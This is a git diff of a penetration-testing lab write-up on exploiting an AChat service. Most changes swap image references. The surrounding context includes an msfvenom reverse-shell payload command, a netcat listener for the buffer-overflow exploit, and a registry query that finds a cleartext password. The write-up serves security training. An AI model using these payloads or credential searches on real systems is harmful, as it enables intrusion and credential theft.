@@ -65,19 +65,19 @@ Notes:
 
 * I attemped to list the SMB shares and map them out, but I keep getting a strange error upon doing so...
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Port 9255 & 9256 AChat Chat System
 
 <mark style="color:yellow;">Netcat Banner Grabbing Attempt</mark>:
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 * I also tried to navigate to the HTTP port 9255 and 9256 but it wasn't returning results
 
 <mark style="color:yellow;">Searchsploit</mark>:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 * <mark style="color:yellow;">36025.py Achat Remote Buffer Overflow</mark>
 
@@ -188,9 +188,7 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.2
 * Next, start a Netcat listener on port 443
 * Run the exploit with Python2 and detonate the SEH bypass BOF
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
-
-
+<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -201,4 +199,5 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.2
 * Let's look for cleartext passwords
   * <mark style="color:red;">`reg query HKLM /f password /t REG_SZ /s`</mark>
   * <mark style="color:yellow;">DefaultPassword REG\_SZ Welcome1!</mark>
+* It appears that we have some creds!
 *
